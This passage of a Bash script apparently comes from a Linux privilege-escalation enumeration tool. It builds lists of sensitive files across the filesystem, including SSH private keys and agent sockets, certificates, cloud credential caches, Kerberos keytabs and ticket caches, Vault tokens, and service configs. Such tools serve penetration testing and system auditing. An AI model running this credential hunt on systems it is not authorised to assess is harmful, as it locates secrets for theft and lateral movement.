  PSTORAGE_LOG4SHELL=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}cdrom|^$GREPHOMESEARCH|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}media|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}var" | grep -E "log4j-core.*\.jar$" | sort | uniq | head -n 70)
  PSTORAGE_OPENVPN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.ovpn$" | sort | uniq | head -n 70)
  PSTORAGE_SSH=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "id_dsa.*$|id_rsa.*$|known_hosts$|authorized_hosts$|authorized_keys$|.*\.pub$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSB4=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/usr/share/|/usr/local/lib/|/usr/lib.*' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pem$|.*\.cer$|.*\.crt$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSBIN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/usr/share/|/usr/local/lib/|/usr/lib/.*|^/usr/share/|/usr/local/lib/|/usr/lib/.*' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.csr$|.*\.der$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSCLIENT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/usr/share/|/usr/local/lib/|/usr/lib/.*' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pfx$|.*\.p12$" | sort | uniq | head -n 70)
  PSTORAGE_SSH_AGENTS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '.dll' | grep -E "^${ROOT_FOLDER}tmp" | grep -E "agent.*$" | sort | uniq | head -n 70)
  PSTORAGE_SSH_CONFIG=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}usr|^$GREPHOMESEARCH" | grep -E "ssh.*config$" | sort | uniq | head -n 70)
  PSTORAGE_SNYK=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "snyk\.json$|snyk\.config\.json$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUD_CREDENTIALS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "credentials\.db$|legacy_credentials\.db$|adc\.json$|\.boto$|\.credentials\.json$|firebase-tools\.json$|access_tokens\.db$|access_tokens\.json$|accessTokens\.json$|gcloud$|legacy_credentials$|azureProfile\.json$|TokenCache\.dat$|AzureRMContext\.json$|ErrorRecords$|TokenCache\.dat$|\.bluemix$|doctl$" | sort | uniq | head -n 70)
  PSTORAGE_ROAD_RECON=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.roadtools_auth$" | sort | uniq | head -n 70)
  PSTORAGE_FREEIPA=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ipa$|dirsrv$" | sort | uniq | head -n 70)
  PSTORAGE_KERBEROS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "krb5\.conf$|.*\.keytab$|\.k5login$|krb5cc_.*$|kadm5\.acl$|secrets\.ldb$|\.secrets\.mkey$|sssd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_KIBANA=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kibana\.y.*ml$" | sort | uniq | head -n 70)
  PSTORAGE_GRAFANA=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "grafana\.ini$" | sort | uniq | head -n 70)
  PSTORAGE_KNOCKD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/etc/init.d/' | grep -E "^${ROOT_FOLDER}etc" | grep -E ".*knockd.*$" | sort | uniq | head -n 70)
  PSTORAGE_LOGSTASH=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "logstash$" | sort | uniq | head -n 70)
  PSTORAGE_ELASTICSEARCH=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "elasticsearch\.y.*ml$" | sort | uniq | head -n 70)
  PSTORAGE_VAULT_SSH_HELPER=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "vault-ssh-helper\.hcl$" | sort | uniq | head -n 70)
  PSTORAGE_VAULT_SSH_TOKEN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.vault-token$" | sort | uniq | head -n 70)
  PSTORAGE_COUCHDB=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "couchdb$" | sort | uniq | head -n 70)
  PSTORAGE_REDIS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "redis\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_MOSQUITTO=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mosquitto\.conf$" | sort | uniq | head -n 70)
